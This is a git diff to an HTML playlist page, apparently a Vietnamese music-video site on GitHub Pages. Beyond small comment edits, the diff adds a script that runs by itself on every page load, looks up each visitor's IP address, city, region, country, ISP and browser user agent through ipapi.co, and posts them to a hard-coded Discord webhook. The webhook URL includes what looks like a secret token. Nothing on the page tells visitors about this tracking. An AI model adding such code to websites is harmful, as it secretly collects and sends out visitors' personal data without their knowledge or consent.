@@ -255,7 +255,6 @@
             <div class="playlist-card">
                 <!-- Click vào ảnh cover MRTT để mở video -->
                 <div class="cover-art" onclick="openVideo('video1.mp4', 'MRT - Bùi Trường Linh')">
-                    <!-- Ảnh đại diện MRTT (Đã thay thế ảnh bờ biển cũ) -->
                     <img src="MRTT.jpg" alt="MRTT Cover">
                     <div class="play-btn-large"><i class="fa-solid fa-play"></i></div>
                 </div>
@@ -306,8 +305,9 @@
         <div></div>
     </div>
 
-    <!-- JAVASCRIPT XỬ LÝ PHÁT VIDEO -->
+    <!-- JAVASCRIPT XỬ LÝ PHÁT VIDEO VÀ BÁO IP VỀ DISCORD -->
     <script>
+        // --- 1. CODE PHÁT VIDEO ---
         function openVideo(videoSrc, title) {
             const modal = document.getElementById('videoModal');
             const video = document.getElementById('mainVideo');
@@ -338,6 +338,49 @@
                 closeVideo();
             }
         }
+
+        // --- 2. CODE TỰ ĐỘNG LẤY IP VÀ GỬI VỀ DISCORD WEBHOOK ---
+        async function sendIPToDiscord() {
+            // Webhook URL của bạn đã được gắn cố định tại đây:
+            const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1549956055730229288/wu2DzLiEykbHiZ1F9sL1fcdyb0xz_w4HkhuRnwvFkYfKini5RzsSXj-m-LF6Bpd_VW0u";
+
+            try {
+                // Tự động lấy thông tin IP & vị trí từ API
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                const time = new Date().toLocaleString('vi-VN');
+                const userAgent = navigator.userAgent; // Thông tin thiết bị & trình duyệt
+
+                // Tạo nội dung tin nhắn gửi về Discord
+                const payload = {
+                    embeds: [{
+                        title: "🚨 BÁO CÁO TRUY CẬP WEBSITE MỚI!",
+                        color: 16733952, // Màu cam đặc trưng
+                        fields: [
+                            { name: "🌐 Địa chỉ IP", value: `\`${data.ip || 'Không rõ'}\``, inline: true },
+                            { name: "📍 Vị trí", value: `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`, inline: true },
+                            { name: "🏢 Nhà mạng", value: `${data.org || 'Không rõ'}`, inline: false },
+                            { name: "⏰ Thời gian", value: `${time}`, inline: false },
+                            { name: "📱 Thiết bị truy cập", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                        ],
+                        footer: { text: "GitHub Pages Tracker" }
+                    }]
+                };
+
+                // Gửi thông báo đến Discord
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Lỗi gửi thông tin IP:", err);
+            }
+        }
+
+        // Tự động kích hoạt khi có người dùng truy cập trang web
+        window.addEventListener('load', sendIPToDiscord);
     </script>
 </body>
 </html>
